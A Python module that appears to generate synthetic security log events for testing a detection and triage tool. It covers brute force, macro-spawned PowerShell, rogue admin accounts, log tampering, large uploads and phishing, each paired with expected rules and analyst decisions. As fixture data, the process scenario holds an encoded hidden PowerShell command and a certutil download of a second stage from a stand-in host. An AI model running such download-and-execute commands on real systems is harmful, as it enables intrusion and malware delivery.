"""Deterministic synthetic security scenarios.

All values are fictitious: addresses come from the RFC 5737 documentation
ranges (192.0.2.0/24, 198.51.100.0/24, 203.0.113.0/24), domains use the
reserved ``.example`` and ``.test`` TLDs, and account names are generic.
Every generated event carries ``raw.synthetic = true`` and a scenario ID.
"""

from __future__ import annotations

from collections.abc import Callable
from dataclasses import dataclass
from datetime import datetime, timedelta
from typing import Any

from app.schemas import EventIn

SYNTHETIC_SOURCES: dict[str, tuple[str, str]] = {
    # key: (name, source_type)
    "vpn": ("VPN gateway (synthetic)", "custom"),
    "winsec": ("Windows Security log (synthetic)", "windows_security"),
    "sysmon": ("Sysmon (synthetic)", "sysmon"),
    "firewall": ("Egress firewall (synthetic)", "firewall"),
    "dns": ("DNS resolver (synthetic)", "dns"),
    "proxy": ("Web proxy (synthetic)", "proxy"),
    "email": ("Email gateway (synthetic)", "email_gateway"),
}


@dataclass
class Scenario:
    id: str
    name: str
    description: str
    expected_rules: list[str]
    expected_decision: str
    build: Callable[[datetime, str], list[tuple[str, EventIn]]]


def _ev(source: str, at: datetime, event_type: str, scenario: str, **fields: Any) -> tuple[str, EventIn]:
    raw = {"synthetic": True, "scenario": scenario, "generator": "sentinelforge-scenarios/1", **fields.pop("raw", {})}
    return source, EventIn(event_time=at, event_type=event_type, raw=raw, **fields)  # type: ignore[arg-type]


def brute_force(t: datetime, v: str = "") -> list[tuple[str, EventIn]]:
    sid = "auth-bruteforce"
    user = f"fin.user01{v}"
    out = [
        _ev("vpn", t + timedelta(seconds=30 * i), "auth.failure", sid, user_name=user, src_ip="203.0.113.45", host="vpn-gw-01", outcome="failure", message="Invalid credentials")
        for i in range(9)
    ]
    out.append(_ev("vpn", t + timedelta(minutes=5), "auth.success", sid, user_name=user, src_ip="203.0.113.45", host="vpn-gw-01", outcome="success", message="Session established"))
    out.append(_ev("winsec", t + timedelta(minutes=9), "auth.success", sid, user_name=user, src_ip="10.20.30.5", host="fin-ws-014", outcome="success"))
    return out


def suspicious_process(t: datetime, v: str = "") -> list[tuple[str, EventIn]]:
    sid = "proc-office-powershell"
    host, user = "fin-ws-014", f"fin.user01{v}"
    return [
        _ev(
            "sysmon",
            t,
            "process.start",
            sid,
            host=host,
            user_name=user,
            process_name="WINWORD.EXE",
            parent_process="explorer.exe",
            command_line='"WINWORD.EXE" /n "C:\\Users\\fin.user01\\Downloads\\Q3-statement.docm"',
        ),
        _ev(
            "sysmon",
            t + timedelta(seconds=40),
            "process.start",
            sid,
            host=host,
            user_name=user,
            process_name="powershell.exe",
            parent_process="WINWORD.EXE",
            command_line="powershell.exe -NoP -W Hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAKQA=",
        ),
        _ev(
            "sysmon",
            t + timedelta(minutes=1),
            "process.start",
            sid,
            host=host,
            user_name=user,
            process_name="certutil.exe",
            parent_process="powershell.exe",
            command_line="certutil.exe -urlcache -split -f http://cdn-update.test/stage2.bin C:\\Users\\Public\\stage2.bin",
            file_hash="9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08",
        ),
        _ev("dns", t + timedelta(minutes=1, seconds=2), "dns.query", sid, host=host, user_name=user, domain="cdn-update.test", src_ip="10.20.30.14"),
        _ev("firewall", t + timedelta(minutes=3), "network.connection", sid, host=host, src_ip="10.20.30.14", dst_ip="198.51.100.23", dst_port=4444, bytes_out=18432),
    ]


def privileged_account(t: datetime, v: str = "") -> list[tuple[str, EventIn]]:
    sid = "iam-priv-account"
    return [
        _ev("winsec", t, "auth.success", sid, host="dc-01", user_name="svc_backup", src_ip="10.20.30.14", outcome="success"),
        _ev(
            "winsec",
            t + timedelta(minutes=2),
            "iam.user_created",
            sid,
            host="dc-01",
            user_name="svc_backup",
            target_user=f"helpdesk_tmp{v}",
            message="A user account was created (4720)",
        ),
        _ev(
            "winsec",
            t + timedelta(minutes=6),
            "iam.group_member_added",
            sid,
            host="dc-01",
            user_name="svc_backup",
            target_user=f"helpdesk_tmp{v}",
            group_name="Domain Admins",
            message="A member was added to a security-enabled global group (4728)",
        ),
    ]


def logging_disabled(t: datetime, v: str = "") -> list[tuple[str, EventIn]]:
    sid = "defense-logging-tamper"
    host = f"fin-ws-014{v}"
    return [
        _ev("winsec", t, "service.stopped", sid, host=host, user_name="fin.user01", process_name="Sysmon64", message="The Sysmon64 service entered the stopped state (7036)"),
        _ev("winsec", t + timedelta(minutes=1), "log.cleared", sid, host=host, user_name="fin.user01", message="The audit log was cleared (1102)"),
    ]


def outbound_traffic(t: datetime, v: str = "") -> list[tuple[str, EventIn]]:
    sid = "net-outbound"
    host = f"eng-ws-021{v}"
    return [
        _ev("dns", t, "dns.query", sid, host=host, user_name="eng.user03", domain="files-share.example", src_ip="10.20.40.21"),
        _ev(
            "firewall",
            t + timedelta(minutes=1),
            "network.connection",
            sid,
            host=host,
            src_ip="10.20.40.21",
            dst_ip="198.51.100.77",
            dst_port=443,
            domain="files-share.example",
            bytes_out=251_658_240,
        ),
        _ev("firewall", t + timedelta(minutes=20), "network.connection", sid, host=host, src_ip="10.20.40.21", dst_ip="192.0.2.80", dst_port=1337, bytes_out=4096),
    ]


def phishing(t: datetime, v: str = "") -> list[tuple[str, EventIn]]:
    sid = "phish-invoice"
    user = f"hr.user02{v}"
    return [
        _ev(
            "email",
            t,
            "email.delivered",
            sid,
            user_name=user,
            email_sender="billing@invoice-portal.example",
            email_subject="ACTION REQUIRED: overdue invoice #44812",
            url="https://invoice-portal.example/view?id=44812",
            domain="invoice-portal.example",
            raw={"spf": "fail", "dkim": "none"},
        ),
        _ev("dns", t + timedelta(minutes=7), "dns.query", sid, host="hr-ws-002", user_name=user, domain="invoice-portal.example", src_ip="10.20.50.2"),
        _ev(
            "proxy",
            t + timedelta(minutes=7, seconds=3),
            "proxy.request",
            sid,
            host="hr-ws-002",
            user_name=user,
            domain="invoice-portal.example",
            url="https://invoice-portal.example/view?id=44812",
            dst_ip="203.0.113.99",
            dst_port=443,
        ),
        # A wanted newsletter that is also clicked: produces an alert analysts should close as benign.
        _ev(
            "email",
            t + timedelta(minutes=12),
            "email.delivered",
            sid,
            user_name=user,
            email_sender="digest@newsletter.example",
            email_subject="Weekly digest",
            url="https://newsletter.example/issue/41",
            domain="newsletter.example",
            raw={"spf": "pass", "dkim": "pass"},
        ),
        _ev(
            "proxy",
            t + timedelta(minutes=15),
            "proxy.request",
            sid,
            host="hr-ws-002",
            user_name=user,
            domain="newsletter.example",
            url="https://newsletter.example/issue/41",
            dst_ip="198.51.100.10",
            dst_port=443,
        ),
    ]


def background_noise(t: datetime, v: str = "") -> list[tuple[str, EventIn]]:
    """Benign activity that should not raise alerts."""
    sid = "background"
    out: list[tuple[str, EventIn]] = []
    users = [
        ("fin.user01", "fin-ws-014", "10.20.30.14"),
        ("hr.user02", "hr-ws-002", "10.20.50.2"),
        ("eng.user03", "eng-ws-021", "10.20.40.21"),
        ("it.admin01", "it-ws-001", "10.20.10.1"),
    ]
    for i, (user, host, ip) in enumerate(users):
        base = t + timedelta(minutes=i * 7)
        out.append(_ev("winsec", base, "auth.success", sid, user_name=user, host=host, src_ip=ip, outcome="success"))
        out.append(_ev("winsec", base + timedelta(minutes=1), "auth.failure", sid, user_name=user, host=host, src_ip=ip, outcome="failure"))
        out.append(
            _ev(
                "sysmon",
                base + timedelta(minutes=2),
                "process.start",
                sid,
                host=host,
                user_name=user,
                process_name="msedge.exe",
                parent_process="explorer.exe",
                command_line='"msedge.exe" --profile-directory=Default',
            )
        )
        out.append(_ev("dns", base + timedelta(minutes=3), "dns.query", sid, host=host, user_name=user, domain="intranet.example", src_ip=ip))
        out.append(_ev("firewall", base + timedelta(minutes=4), "network.connection", sid, host=host, src_ip=ip, dst_ip="198.51.100.10", dst_port=443, bytes_out=5400 + i * 100))
    out.append(_ev("winsec", t + timedelta(minutes=40), "service.stopped", sid, host="it-ws-001", user_name="it.admin01", process_name="Spooler"))
    return out


SCENARIOS: dict[str, Scenario] = {
    s.id: s
    for s in [
        Scenario(
            "auth-bruteforce",
            "Repeated sign-in failures, then success",
            "Nine VPN sign-in failures from a documentation-range address followed by a successful session.",
            ["SF-AUTH-001"],
            "Treat as likely account compromise: reset the password, revoke sessions and review the source address. Close as true positive once the user confirms the activity was not theirs.",
            brute_force,
        ),
        Scenario(
            "proc-office-powershell",
            "Office document launches encoded PowerShell",
            "A macro document spawns encoded PowerShell, which downloads a second stage with certutil and connects out on port 4444.",
            ["SF-PROC-001", "SF-NET-001"],
            "Isolate the host, collect the downloaded file and process tree, and escalate to an incident. True positive.",
            suspicious_process,
        ),
        Scenario(
            "iam-priv-account",
            "New account added to Domain Admins",
            "A service account creates a new user and adds it to Domain Admins four minutes later.",
            ["SF-IAM-001"],
            "Confirm with the identity team whether a change ticket exists. Without one, disable the account and investigate the service account. Likely true positive.",
            privileged_account,
        ),
        Scenario(
            "defense-logging-tamper",
            "Sysmon stopped and audit log cleared",
            "Endpoint telemetry service stopped followed by the Security log being cleared.",
            ["SF-DEF-001"],
            "Restore logging, treat the gap as unknown activity, and correlate with other alerts on the host. True positive unless an approved rebuild explains it.",
            logging_disabled,
        ),
        Scenario(
            "net-outbound",
            "Large upload and non-standard port",
            "A 240 MiB upload to an external address on 443, then a connection on port 1337.",
            ["SF-NET-001"],
            "Check whether the destination is a sanctioned service. The upload alone may be benign positive; the port 1337 connection needs host investigation.",
            outbound_traffic,
        ),
        Scenario(
            "phish-invoice",
            "Phishing link followed",
            "An invoice-themed email with failing SPF is clicked seven minutes after delivery; a wanted newsletter is also clicked.",
            ["SF-MAIL-001"],
            "Phish: purge the message, block the domain, reset credentials if entered (true positive). Newsletter: close as benign positive.",
            phishing,
        ),
    ]
}


def scenario_metadata() -> list[dict[str, Any]]:
    return [
        {"id": s.id, "name": s.name, "description": s.description, "expected_rules": s.expected_rules, "expected_decision": s.expected_decision, "synthetic": True}
        for s in SCENARIOS.values()
    ]
